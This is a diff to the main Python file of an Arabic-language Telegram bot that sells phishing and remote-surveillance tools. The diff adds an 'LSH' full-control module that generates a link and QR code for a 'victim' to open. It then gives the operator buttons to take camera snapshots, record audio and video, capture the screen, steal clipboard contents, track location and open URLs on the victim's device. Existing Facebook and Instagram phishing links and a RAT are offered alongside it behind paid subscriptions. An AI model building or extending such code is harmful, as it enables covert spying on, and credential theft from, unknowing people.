@@ -1,6 +1,8 @@
 # main.py
 import os
+import io
 import threading
+import requests
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
@@ -39,7 +41,33 @@ except Exception as e:
     generate_qr_code_bytes = lambda *args: None
 
 # ============================================================
-# استيراد نظام الدفع (جديد)
+# استيراد LSH Module (أداة السيطرة الكاملة)
+# ============================================================
+try:
+    from lsh_module import (
+        init_lsh_routes,
+        lsh_bp,
+        generate_qr_code_bytes as lsh_generate_qr,
+        set_bot_reference,
+        push_command as lsh_push_command,
+        get_session as lsh_get_session,
+        build_lsh_control_panel,
+    )
+    LSH_ENABLED = True
+except Exception as e:
+    print(f"[-] Error importing lsh_module: {e}")
+    LSH_ENABLED = False
+
+    def init_lsh_routes(app, bot): pass
+    def set_bot_reference(bot): pass
+    def lsh_push_command(*a, **kw): return False
+    def lsh_get_session(*a, **kw): return None
+    def lsh_generate_qr(*a, **kw): return io.BytesIO()
+    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
+    lsh_bp = None
+
+# ============================================================
+# استيراد نظام الدفع
 # ============================================================
 try:
     from stars_payment import (
@@ -54,6 +82,7 @@ try:
         send_invoice,
         PRICING_PLANS,
         FREE_TRIAL_USES,
+        AVAILABLE_TOOLS,
     )
     PAYMENT_ENABLED = True
 except Exception as e:
@@ -71,6 +100,7 @@ except Exception as e:
     def send_invoice(*a, **kw): pass
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 1
+    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh"]
 
 
 # ============================================================
@@ -114,11 +144,17 @@ if rat_bp:
     app.register_blueprint(rat_bp)
 if qr_bp:
     app.register_blueprint(qr_bp)
+if LSH_ENABLED and lsh_bp:
+    app.register_blueprint(lsh_bp)
 
 init_facebook_routes(app, bot)
 init_instagram_routes(app, bot)
 init_rat_routes(app, bot)
 init_qr_routes(app, bot)
+init_lsh_routes(app, bot)
+
+if LSH_ENABLED:
+    set_bot_reference(bot)
 
 # تسجيل معالجات الدفع
 register_payment_handlers(bot)
@@ -133,6 +169,7 @@ def main_menu():
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
     markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
     markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
+    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     return markup
@@ -190,7 +227,9 @@ def start_command(message):
 def callback_handler(call):
     chat_id = call.message.chat.id
 
-    # ---------- قائمة الدفع ----------
+    # ============================================================
+    # قسم الدفع
+    # ============================================================
     if call.data == "payment_menu":
         bot.answer_callback_query(call.id)
         bot.send_message(
@@ -229,7 +268,9 @@ def callback_handler(call):
         bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu())
         return
 
-    # ---------- توليد فيسبوك ----------
+    # ============================================================
+    # توليد فيسبوك
+    # ============================================================
     if call.data == "gen_fb":
         check = can_use_tool(chat_id, "fb")
         if not check["allowed"]:
@@ -242,7 +283,9 @@ def callback_handler(call):
         bot.send_message(chat_id, f"🎯 رابط فيسبوك المخصص:\n `{link}` ", parse_mode="Markdown")
         return
 
-    # ---------- توليد انستقرام ----------
+    # ============================================================
+    # توليد انستقرام
+    # ============================================================
     if call.data == "gen_ig":
         check = can_use_tool(chat_id, "ig")
         if not check["allowed"]:
@@ -255,7 +298,9 @@ def callback_handler(call):
         bot.send_message(chat_id, f"📸 رابط انستقرام المخصص:\n `{link}` ", parse_mode="Markdown")
         return
 
-    # ---------- توليد RAT ----------
+    # ============================================================
+    # توليد RAT
+    # ============================================================
     if call.data == "gen_rat":
         check = can_use_tool(chat_id, "rat")
         if not check["allowed"]:
@@ -273,7 +318,9 @@ def callback_handler(call):
         )
         return
 
-    # ---------- توليد QR ----------
+    # ============================================================
+    # توليد QR
+    # ============================================================
     if call.data == "gen_qr":
         check = can_use_tool(chat_id, "qr")
         if not check["allowed"]:
@@ -305,7 +352,71 @@ def callback_handler(call):
             bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
         return
 
-    # ---------- أوامر RAT اللاحقة (لا تستهلك رصيداً) ----------
+    # ============================================================
+    # توليد LSH (جديد)
+    # ============================================================
+    if call.data == "gen_lsh":
+        check = can_use_tool(chat_id, "lsh")
+        if not check["allowed"]:
+            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
+            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
+            return
+        consume_usage(chat_id, "lsh")
+        bot.answer_callback_query(call.id, "جاري تجهيز جلسة التحكم الكامل...")
+
+        # إنشاء جلسة عبر endpoint داخلي
+        try:
+            resp = requests.post(
+                f"{RAILWAY_URL}/lsh_create",
+                json={"chat_id": chat_id},
+                timeout=10
+            )
+            session_id = resp.json().get("session_id")
+        except Exception as e:
+            print(f"[-] LSH create error: {e}")
+            session_id = None
+
+        # احتياطي: إنشاء الجلسة محلياً إذا فشل الـ HTTP
+        if not session_id:
+            session_id = str(uuid.uuid4()).replace('-', '')[:24]
+            if redis_client:
+                try:
+                    redis_client.setex(f"lsh_session:{session_id}", 86400, chat_id)
+                except Exception as e:
+                    print(f"[-] Redis setex LSH error: {e}")
+
+        target_link = f"{RAILWAY_URL}/lsh?s={session_id}&id={chat_id}"
+        qr_image = lsh_generate_qr(target_link)
+
+        if qr_image:
+            qr_image.name = 'lsh_qr.png'
+            bot.send_photo(
+                chat_id, qr_image,
+                caption=(
+                    "🕹️ **جلسة السيطرة الكاملة جاهزة!**\n"
+                    "━━━━━━━━━━━━━━━━━━\n\n"
+                    "🎯 **وجّه الضحية لمسح الكود أو افتح الرابط:**\n"
+                    f"`{target_link}`\n\n"
+                    "📊 **ما سيتم تلقائياً:**\n"
+                    "• تقرير كامل عن الجهاز + IP الحقيقي\n"
+                    "• صورة من الكاميرا الأمامية\n"
+                    "• تسجيل صوتي من الميكروفون\n"
+                    "• لوحة تحكم حية بأزرار تفاعلية\n\n"
+                    "⚠️ الجلسة تنتهي بعد 24 ساعة."
+                ),
+                parse_mode="Markdown"
+            )
+        else:
+            bot.send_message(
+                chat_id,
+                f"🕹️ **رابط الجلسة:**\n`{target_link}`",
+                parse_mode="Markdown"
+            )
+        return
+
+    # ============================================================
+    # أوامر RAT (لا تستهلك رصيداً)
+    # ============================================================
     if call.data.startswith("rat_cam_"):
         target_chat_id = call.data.replace("rat_cam_", "")
         queue_command(target_chat_id, "snapshot")
@@ -318,14 +429,97 @@ def callback_handler(call):
         bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
         return
 
+    # ============================================================
+    # أوامر LSH (لا تستهلك رصيداً)
+    # ============================================================
+    if call.data.startswith("lsh_snap_"):
+        sid = call.data.replace("lsh_snap_", "")
+        lsh_push_command(sid, {"action": "snapshot"})
+        bot.answer_callback_query(call.id, "⏳ جاري طلب صورة من الضحية...")
+        return
+
+    if call.data.startswith("lsh_audio_"):
+        sid = call.data.replace("lsh_audio_", "")
+        lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
+        bot.answer_callback_query(call.id, "⏳ جاري التسجيل من الميكروفون...")
+        return
+
+    if call.data.startswith("lsh_video_"):
+        sid = call.data.replace("lsh_video_", "")
+        lsh_push_command(sid, {"action": "video_recording", "payload": {"duration": 10000}})
+        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الفيديو...")
+        return
+
+    if call.data.startswith("lsh_screen_"):
+        sid = call.data.replace("lsh_screen_", "")
+        lsh_push_command(sid, {"action": "screen_share"})
+        bot.answer_callback_query(call.id, "⏳ جاري التقاط الشاشة...")
+        return
+
+    if call.data.startswith("lsh_clip_"):
+        sid = call.data.replace("lsh_clip_", "")
+        lsh_push_command(sid, {"action": "get_clipboard"})
+        bot.answer_callback_query(call.id, "⏳ جاري سحب الحافظة...")
+        return
+
+    if call.data.startswith("lsh_loc_"):
+        sid = call.data.replace("lsh_loc_", "")
+        lsh_push_command(sid, {"action": "request_location"})
+        bot.answer_callback_query(call.id, "⏳ جاري تحديث الموقع...")
+        return
+
+    if call.data.startswith("lsh_open_"):
+        sid = call.data.replace("lsh_open_", "")
+        bot.answer_callback_query(call.id, "أرسل الرابط الآن")
+        _pending_open_url[chat_id] = sid
+        bot.send_message(
+            chat_id,
+            "🌐 **أرسل الرابط الذي تريد فتحه على جهاز الضحية**\n"
+            "(يجب أن يبدأ بـ http:// أو https://)"
+        )
+        return
+
+    if call.data.startswith("lsh_vibrate_"):
+        sid = call.data.replace("lsh_vibrate_", "")
+        lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500, 200, 500]}})
+        bot.answer_callback_query(call.id, "✅ تم تفعيل الاهتزاز")
+        return
+
+    if call.data.startswith("lsh_kill_"):
+        sid = call.data.replace("lsh_kill_", "")
+        lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
+        bot.answer_callback_query(call.id, "✅ تم إنهاء الجلسة")
+        return
+
+
+# ============================================================
+# معالجة الرابط المُدخل لفتحه على الضحية
+# ============================================================
+_pending_open_url = {}
+
+
+@bot.message_handler(func=lambda m: m.chat.id in _pending_open_url and m.text and m.text.startswith("http"))
+def handle_open_url(message):
+    sid = _pending_open_url.pop(message.chat.id, None)
+    if sid:
+        lsh_push_command(sid, {"action": "open_url", "payload": {"url": message.text}})
+        bot.send_message(message.chat.id, "✅ سيتم فتح الرابط على جهاز الضحية خلال ثوانٍ")
+
 
 # ============================================================
 # تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     print("[+] Starting Telegram Bot polling in background thread...")
+    # حذف أي Webhook قديم حتى يعمل polling بشكل صحيح
     try:
-        bot.infinity_polling(skip_pending=True)
+        bot.delete_webhook(drop_pending_updates=True)
+        print("[+] Old webhook deleted, polling mode active")
+    except Exception as e:
+        print(f"[-] delete_webhook warning: {e}")
+
+    try:
+        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
     except Exception as e:
         print(f"[-] Telegram Polling Error: {e}")
 
